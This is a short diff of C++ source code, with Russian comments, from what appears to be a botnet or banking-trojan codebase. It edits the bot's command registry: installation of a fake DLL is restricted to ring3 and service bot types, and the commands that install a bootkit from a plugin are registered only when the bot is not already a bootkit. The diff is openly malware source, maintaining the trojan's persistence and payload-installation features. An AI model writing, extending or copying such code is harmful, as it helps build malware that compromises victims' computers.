@@ -758,6 +758,8 @@ bool ExecuteUpdate(PTaskManager, PCHAR Command, PCHAR Args)
 	return Result;
 }
 
+
+
 bool ExecuteLoadDLL(PTaskManager, PCHAR Command, PCHAR Args)
 {
 	// Команда на загрузку библиотеки
@@ -1143,6 +1145,10 @@ void AsyncInstallFakeDll(void* Arguments)
 
 bool ExecuteInstallFakeDll(void* Manager, PCHAR Command, PCHAR Args)
 {
+	// Установку длл разрешаем только в ринг3 и сервисе бота
+	if (BOT::GetBotType() != BotRing3 && BOT::GetBotType() != BotService)
+		return false;
+
 	TASKDBG("ExecuteInstallFakeDll", "Args: '%s'", Args);
 
 	PCHAR ParamList = STR::New(Args);
@@ -1222,11 +1228,14 @@ void RegisterAllCommands(PTaskManager Manager, DWORD Commands)
 	TASKDBG("RegisterAllCommands", "Started with Manager=0x%X Commands=%u", 
 		Manager, Commands);
 
-	// Команда установки Bootkit из плага
-	RegisterCommand(Manager, (PCHAR)Plugin::CommandInstallBk, Plugin::ExecuteInstallBk);
+	if (BOT::GetBotType() != BotBootkit)
+	{
+		// Команда установки Bootkit из плага
+		RegisterCommand(Manager, (PCHAR)Plugin::CommandInstallBk, Plugin::ExecuteInstallBk);
 
-	// Команда установки Bootkit из плага c включением статистического отстука
-	RegisterCommand(Manager, (PCHAR)Plugin::CommandInstallBkStat, Plugin::ExecuteInstallBkStat);
+		// Команда установки Bootkit из плага c включением статистического отстука
+		RegisterCommand(Manager, (PCHAR)Plugin::CommandInstallBkStat, Plugin::ExecuteInstallBkStat);
+    }
 
 	// Команда обновления плага
 	RegisterCommand(Manager, (PCHAR)Plugin::CommandUpdatePlug, Plugin::ExecuteUpdatePlug);
